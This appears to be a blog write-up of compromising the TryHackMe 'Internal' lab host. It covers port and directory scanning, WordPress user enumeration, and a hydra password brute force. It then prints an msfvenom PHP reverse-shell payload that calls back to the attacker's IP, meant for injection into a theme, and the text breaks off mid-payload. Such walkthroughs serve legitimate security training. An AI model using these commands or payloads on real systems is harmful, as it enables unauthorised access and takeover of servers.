<!doctype html><html lang=en-us><head><title>Internal Boot2Root Write-Up | Nate Catelli's Blog</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="A boot2root writeup of the Internal host from TryHackMe."><meta name=generator content="Hugo 0.101.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon></head><body><nav class=navigation><a href=/><span class=arrow>‚Üê</span>Home</a>
<a href=/posts>Archive</a>
<a href=/tags>Tags</a>
<a href=/about>About</a>
<a href=/projects>Projects</a>
<a href=/misc>Misc</a>
<a class=button href=https://ncatelli.github.io/index.xml>Subscribe</a></nav><main class=main><section id=single><h1 class=title>Internal Boot2Root Write-Up</h1><div class=tip><time datetime="2020-12-05 00:00:00 +0000 UTC">Dec 5, 2020</time>
<span class=split>¬∑</span>
<span>3236 words</span>
<span class=split>¬∑</span>
<span>16 minute read</span></div><aside class=toc><details><summary>Table of Contents</summary><div><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#environment>Environment</a></li><li><a href=#attack>Attack</a><ul><li><a href=#host-enumeration>Host enumeration</a></li><li><a href=#investigating-the-webserver>Investigating the webserver</a></li><li><a href=#investigating-the-wordpress-blog>Investigating the wordpress blog</a></li><li><a href=#bruteforcing-the-admin-wordpress-user>Bruteforcing the admin wordpress user</a></li><li><a href=#popping-a-shell-through-wp-admin>Popping a shell through wp admin</a></li><li><a href=#enumerating-the-local-user>Enumerating the local user</a></li><li><a href=#connecting-to-jenkins>Connecting to jenkins</a></li><li><a href=#enumerating-the-aubreanna-user>Enumerating the aubreanna user</a></li><li><a href=#cracking-the-jenkins-admin-credentials>Cracking the Jenkins admin credentials</a></li><li><a href=#popping-a-shell-in-jenkins>Popping a shell in jenkins</a></li><li><a href=#root-shell>Root shell</a></li></ul></li><li><a href=#summary>Summary</a></li></ul></nav></div></details></aside><div class=content><h2 id=introduction>Introduction <a href=#introduction class=anchor>üîó</a></h2><p>The Internal host took almost 24 hours to complete due to the sheer number of pivots required to complete it. Unlike many of the other boot2roots I&rsquo;ve completed on THM, this host required a significant amount of review and manual poking around on the host, above and beyond the results of automated enumeration tools like linPEAS. I thought it was incredibly brilliant machine.</p><h2 id=environment>Environment <a href=#environment class=anchor>üîó</a></h2><p>The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target host. Information about the host was limited, however, I knew there would be two flags a user and root flag. It was also known that the host, known by the domain internal.thm, hosted a webserver and was the only host in scope.</p><h2 id=attack>Attack <a href=#attack class=anchor>üîó</a></h2><p>Prior to starting the attack, I prepared my workstation by setting up burpsuite, installing the certificates in firefox and defining the scope to include only the target host. I also opened msfconsole and configured it to connect to a postgres backend of msfdb. I also installed <code>jq</code>, <a href=https://github.com/OJ/gobuster target=_blank rel=noopener>gobuster</a> and the <a href=https://github.com/danielmiessler/SecLists target=_blank rel=noopener>seclists</a> wordlist collections. Finally I added <code>internal.thm</code> to my hosts file mapped to the target IP per the provide scope document.</p><h3 id=host-enumeration>Host enumeration <a href=#host-enumeration class=anchor>üîó</a></h3><p>I started the attack by running SYN version and OS scans against the host which identified only 2 open ports for ssh and http, and also confirming that this host was running linux.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; db_nmap -sS -sV -O 10.10.215.86
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-12-05 04:12 UTC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-215-86.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.215.86<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Host is up <span style=color:#f92672>(</span>0.00049s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Not shown: <span style=color:#ae81ff>998</span> closed ports
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: MAC Address: 02:92:71:78:CF:69 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: TCP/IP fingerprint:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS:SCAN<span style=color:#f92672>(</span>V<span style=color:#f92672>=</span>7.80%E<span style=color:#f92672>=</span>4%D<span style=color:#f92672>=</span>12/5%OT<span style=color:#f92672>=</span>22%CT<span style=color:#f92672>=</span>1%CU<span style=color:#f92672>=</span>34196%PV<span style=color:#f92672>=</span>Y%DS<span style=color:#f92672>=</span>1%DC<span style=color:#f92672>=</span>D%G<span style=color:#f92672>=</span>Y%M<span style=color:#f92672>=</span>029271%T
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS:M<span style=color:#f92672>=</span>5FCB08D5%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu<span style=color:#f92672>)</span>SEQ<span style=color:#f92672>(</span>SP<span style=color:#f92672>=</span>103%GCD<span style=color:#f92672>=</span>1%ISR<span style=color:#f92672>=</span>108%TI<span style=color:#f92672>=</span>Z%CI<span style=color:#f92672>=</span>Z%II<span style=color:#f92672>=</span>I
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS:%TS<span style=color:#f92672>=</span>A<span style=color:#f92672>)</span>OPS<span style=color:#f92672>(</span>O1<span style=color:#f92672>=</span>M2301ST11NW7%O2<span style=color:#f92672>=</span>M2301ST11NW7%O3<span style=color:#f92672>=</span>M2301NNT11NW7%O4<span style=color:#f92672>=</span>M2301ST11N
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS:W7%O5<span style=color:#f92672>=</span>M2301ST11NW7%O6<span style=color:#f92672>=</span>M2301ST11<span style=color:#f92672>)</span>WIN<span style=color:#f92672>(</span>W1<span style=color:#f92672>=</span>F4B3%W2<span style=color:#f92672>=</span>F4B3%W3<span style=color:#f92672>=</span>F4B3%W4<span style=color:#f92672>=</span>F4B3%W5<span style=color:#f92672>=</span>F
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS:4B3%W6<span style=color:#f92672>=</span>F4B3<span style=color:#f92672>)</span>ECN<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>F507%O<span style=color:#f92672>=</span>M2301NNSNW7%CC<span style=color:#f92672>=</span>Y%Q<span style=color:#f92672>=)</span>T1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS:<span style=color:#f92672>=</span>40%S<span style=color:#f92672>=</span>O%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AS%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T2<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T3<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T4<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>R
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS:%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T5<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T6<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS:40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T7<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS:%Q<span style=color:#f92672>=)</span>U1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%IPL<span style=color:#f92672>=</span>164%UN<span style=color:#f92672>=</span>0%RIPL<span style=color:#f92672>=</span>G%RID<span style=color:#f92672>=</span>G%RIPCK<span style=color:#f92672>=</span>G%RUCK<span style=color:#f92672>=</span>G%RUD<span style=color:#f92672>=</span>G<span style=color:#f92672>)</span>IE<span style=color:#f92672>(</span>R
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS:<span style=color:#f92672>=</span>Y%DFI<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%CD<span style=color:#f92672>=</span>S<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Network Distance: <span style=color:#ae81ff>1</span> hop
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 20.94 seconds
</span></span></code></pre></div><p>To confirm that there was nothing else running on hidden ports, I ran a broader scan against all 65535 ports. I found that it returned nothing more that the above and have omitted the results for that reason.</p><h3 id=investigating-the-webserver>Investigating the webserver <a href=#investigating-the-webserver class=anchor>üîó</a></h3><p>I then decided to move to the webserver and, after opening up the site index, found that I was given the default apache page for ubuntu.</p><p><p class=markdown-image><img src=/static/img/internal_http_index.png alt="webserver index page"></p></p><p>I assumed that there were more directories unlisted and decided to run <code>gobuster</code> with the <code>directory-list-2.3-medium.txt</code> wordlist to attempt to attempt to find anything else that could be sitting on the webserver.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# gobuster dir -u <span style=color:#e6db74>&#39;http://10.10.215.86&#39;</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.0.1
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@_FireFart_<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:            http://10.10.215.86
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:        <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Status codes:   200,204,301,302,307,401,403
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:     gobuster/3.0.1
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:        10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2020/12/05 04:21:49 Starting gobuster
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/blog <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/wordpress <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/javascript <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/phpmyadmin <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>/server-status <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2020/12/05 04:22:11 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>I was lucky to find what looked like two potential paths forward, a blog running wordpress and a phpmyadmin panel. I decided to take the happy path aoproach and have a look at the blog to start.</p><h3 id=investigating-the-wordpress-blog>Investigating the wordpress blog <a href=#investigating-the-wordpress-blog class=anchor>üîó</a></h3><p>The wordpress blog appeared pretty bog-standard after opening the page, looking to be nothing more than a default install of wordpress.</p><p><p class=markdown-image><img src=/static/img/internal_http_blog_index.png alt="wordpress index"></p></p><p>I browsed to a few common wordpress endpoints to confirm that it was that CMS and then chose to run <code>wpscan</code> against it to see if anything significant jumped out at me. Soon after, the scan identified that this was wordpress <code>5.4.2</code> but gave little else that was actionable for the attack.</p><p>With the scan turning up little, I decided to attempt to pull user information from the wordpress api endpoint before looking at other vectors.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# curl -sI http://10.10.215.86/blog/?author<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Date: Sat, <span style=color:#ae81ff>05</span> Dec <span style=color:#ae81ff>2020</span> 04:48:22 GMT
</span></span><span style=display:flex><span>Server: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Link: &lt;http://internal.thm/blog/index.php/wp-json/&gt;; rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://api.w.org/&#34;</span>
</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>UTF-8
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root@kali:~/ctf# curl -s http://internal.thm/blog/index.php/wp-json/wp/v2/users | jq .
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;id&#34;</span>: 1,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;name&#34;</span>: <span style=color:#e6db74>&#34;admin&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;url&#34;</span>: <span style=color:#e6db74>&#34;http://192.168.1.45/blog&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;description&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;link&#34;</span>: <span style=color:#e6db74>&#34;http://internal.thm/blog/index.php/author/admin/&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;slug&#34;</span>: <span style=color:#e6db74>&#34;admin&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;avatar_urls&#34;</span>: <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;24&#34;</span>: <span style=color:#e6db74>&#34;http://1.gravatar.com/avatar/77d33fec916329cf93f20054b38a86ce?s=24&amp;d=mm&amp;r=g&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;48&#34;</span>: <span style=color:#e6db74>&#34;http://1.gravatar.com/avatar/77d33fec916329cf93f20054b38a86ce?s=48&amp;d=mm&amp;r=g&#34;</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;96&#34;</span>: <span style=color:#e6db74>&#34;http://1.gravatar.com/avatar/77d33fec916329cf93f20054b38a86ce?s=96&amp;d=mm&amp;r=g&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;meta&#34;</span>: <span style=color:#f92672>[]</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;_links&#34;</span>: <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;self&#34;</span>: <span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;href&#34;</span>: <span style=color:#e6db74>&#34;http://internal.thm/blog/index.php/wp-json/wp/v2/users/1&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>]</span>,
</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;collection&#34;</span>: <span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;href&#34;</span>: <span style=color:#e6db74>&#34;http://internal.thm/blog/index.php/wp-json/wp/v2/users&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>      <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Luckily this gave me a username, <code>admin</code>, which I decided to attempt to bruteforce while I investigated other vectors.</p><h3 id=bruteforcing-the-admin-wordpress-user>Bruteforcing the admin wordpress user <a href=#bruteforcing-the-admin-wordpress-user class=anchor>üîó</a></h3><p>I pulled the <code>wp-login</code> post-form fields from burpsuite and crafted a hydra attack using the <code>rockyou.txt</code> wordlist for password parameters before stepping away to pour a cup of coffee.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.215.86 http-post-form <span style=color:#e6db74>&#39;/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&amp;testcookie=1:is incorrect&#39;</span>
</span></span><span style=display:flex><span>Hydra v9.1 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2020-12-05 05:17:38
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>14344399</span> login tries <span style=color:#f92672>(</span>l:1/p:14344399<span style=color:#f92672>)</span>, ~896525 tries per task
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking http-post-form://10.10.215.86:80/blog/wp-login.php:log<span style=color:#f92672>=</span>^USER^&amp;pwd<span style=color:#f92672>=</span>^PASS^&amp;wp-submit<span style=color:#f92672>=</span>Log+In&amp;redirect_to<span style=color:#f92672>=</span>http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&amp;testcookie<span style=color:#f92672>=</span>1:is incorrect
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>STATUS<span style=color:#f92672>]</span> 1934.00 tries/min, <span style=color:#ae81ff>1934</span> tries in 00:01h, <span style=color:#ae81ff>14342465</span> to <span style=color:#66d9ef>do</span> in 123:36h, <span style=color:#ae81ff>16</span> active
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>80<span style=color:#f92672>][</span>http-post-form<span style=color:#f92672>]</span> host: 10.10.215.86   login: admin   password: my2boys
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> finished at 2020-12-05 05:19:49
</span></span></code></pre></div><p>By the time I&rsquo;d returned the bruteforce had yielded the password <code>my2boys</code> which I was able to confirm allowed me access to the admin panel.</p><p><p class=markdown-image><img src=/static/img/internal_http_wp_admin.png alt="wordpress admin panel"></p></p><h3 id=popping-a-shell-through-wp-admin>Popping a shell through wp admin <a href=#popping-a-shell-through-wp-admin class=anchor>üîó</a></h3><p>With access to the admin panel, I decided to generate a reverse-tcp meterpreter shell that could be injected into the theme.</p><p>I generated a <code>php/meterpreter/reverse_tcp</code> shell using <code>msfvenom</code> and backed up the index.php theme template before replacing it with the following generated shellcode.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST<span style=color:#f92672>=</span>10.10.253.137 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No platform was selected, choosing Msf::Module::Platform::PHP from the payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No arch selected, selecting arch: php from the payload
</span></span><span style=display:flex><span>No encoder specified, outputting raw payload
</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>1114</span> bytes
</span></span><span style=display:flex><span>/*&lt;?php /**/ error_reporting<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>; $ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;10.10.253.137&#39;</span>; $port <span style=color:#f92672>=</span> 4444; <span style=color:#66d9ef>if</span> <span style=color:#f92672>((</span>$f <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;stream_socket_client&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> is_callable<span style=color:#f92672>(</span>$f<span style=color:#f92672>))</span> <span style=color:#f92672>{</span> $s <span style=color:#f92672>=</span> $f<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;tcp://{</span>$ip<span style=color:#e6db74>}:{</span>$port<span style=color:#e6db74>}&#34;</span><span style=color:#f92672>)</span>; $s_type <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;stream&#39;</span>; <span style=color:#f92672>}</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$s <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>(</span>$f <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;fsockopen&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> is_callable<span style=color:#f92672>(</span>$f<span style=color:#f92672>))</span> <span style=color:#f92672>{</span> $s <span style=color:#f92672>=</span> $f<span style=color:#f92672>(</span>$ip, $port<span style=color:#f92672>)</span>; $s_type <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;stream&#39;</span>; <span style=color:#f92672>}</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$s <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>(</span>$f <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;socket_create&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> is_callable<span style=color:#f92672>(</span>$f<span style=color:#f92672>))</span> <span style=color:#f92672>{</span> $s <span style=color:#f92672>=</span> $f<span style=color:#f92672>(</span>AF_INET, SOCK_STREAM, SOL_TCP<span style=color:#f92672>)</span>; $res <span style=color:#f92672>=</span> @socket_connect<span style=color:#f92672>(</span>$s, $ip, $port<span style=color:#f92672>)</span>; <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$res<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> die<span style=color:#f92672>()</span>; <span style=color:#f92672>}</span> $s_type <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;socket&#39;</span>; <span style=color:#f92672>}</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$s_type<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> die<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;no socket funcs&#39;</span><span style=color:#f92672>)</span>; <span style=color:#f92672>}</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$s<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> die<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;no socket&#39;</span><span style=color:#f92672>)</span>; <span style=color:#f92672>}</span> switch <span style=color:#f92672>(</span>$s_type<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;stream&#39;</span>: $len <span style=color:#f92672>=</span> fread<span style=color:#f92672>(</span>$s, 4<span style=color:#f92672>)</span>; break; <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;socket&#39;</span>: $len <span style=color:#f92672>=</span> socket_read<span style=color:#f92672>(</span>$s, 4<span style=color:#f92672>)</span>; break; <span style=color:#f92672>}</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$len<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> die<span style=color:#f92672>()</span>; <span style=color:#f92672>}</span> $a <span style=color:#f92672>=</span> unpack<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Nlen&#34;</span>, $len<span style=color:#f92672>)</span>; $len <span style=color:#f92672>=</span> $a<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;len&#39;</span><span style=color:#f92672>]</span>; $b <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>; <span style=color:#66d9ef>while</span> <span style=color:#f92672>(</span>strlen<span style=color:#f92672>(</span>$b<span style=color:#f92672>)</span> &lt; $len<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> switch <span style=color:#f92672>(</span>$s_type<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;stream&#39;</span>: $b .<span style=color:#f92672>=</span> fread<span style=color:#f92672>(</span>$s, $len-strlen<span 